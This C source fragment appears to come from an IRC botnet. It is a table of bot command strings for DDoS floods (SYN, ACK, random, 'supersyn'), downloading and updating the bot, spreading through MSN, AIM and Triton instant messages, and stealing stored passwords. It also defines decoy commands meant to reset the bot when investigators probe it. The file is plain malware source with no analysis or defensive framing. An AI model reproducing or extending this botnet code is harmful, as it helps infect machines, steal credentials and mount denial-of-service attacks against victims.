#ifndef NO_DOWNLOAD
const char get_mnd1[]		= "dl";
const char get_mnd2[]		= "dlnew";
const char get_upd1[]		= "new";
const char get_upd2[]		= "updat0r";
#endif

#ifndef NO_DDOS
const char cmd_ddos_syn[]	= "ddos.syn";
const char cmd_ddos_ack[]	= "ddos.ack";
const char cmd_ddos_random[]	= "ddos.random";
#endif

#ifndef NO_SUPERSYN
const char cmd_ddos_supersyn[]	= "ddos.supersyn";
#endif

const char get_auth1[]		= "login";
const char get_auth2[]		= "l";

const char cmd_remove_1[]	= "rm";
const char cmd_remove_2[]	= "byefucker";

#ifndef NO_VISIT
const char cmd_visit[]		= "visit";
#endif

//Fake commands, They will reset the bot till next reboot incase of spy's
const char cmd_fake_remove[]    = "remove";
const char cmd_fakedownload[]   = "download";
const char cmd_fakeupdate[]     = "update";
//Enf of fake cmd's

const char cmd_imspread_1[]	= "msn.msg";
const char cmd_imspread_2[]	= "msn.stop";
const char cmd_aimspread_1[]    = "aim.msg";
const char cmd_aimspread_2[]    = "aim.stop";
const char cmd_timspread_1[]    = "triton.msg";
const char cmd_timspread_2[]    = "triton.stop";

#ifndef NO_PSTORE
const char cmd_pstore_1[]	= "pstore";
const char cmd_pstore_2[]	= "pstore.search";
#endif

const char cmd_threads_1[]	= "threads"; /**********/
const char cmd_threads_2[]	= "t";       /**********/
const char cmd_threads_sub[]	= "sub";     /*UNUSED!!*/
const char cmd_threads_kill_1[]	= "kill";    /**********/
const char cmd_threads_kill_2[]	= "k";       /**********/

const char cmd_join_1[]		= "join";
const char cmd_join_2[]		= "j";

const char cmd_part_1[]		= "part";
const char cmd_part_2[]		= "p";

const char cmd_logout_1[]	= "logout"; // Unused
const char cmd_logout_2[]	= "l";      // ******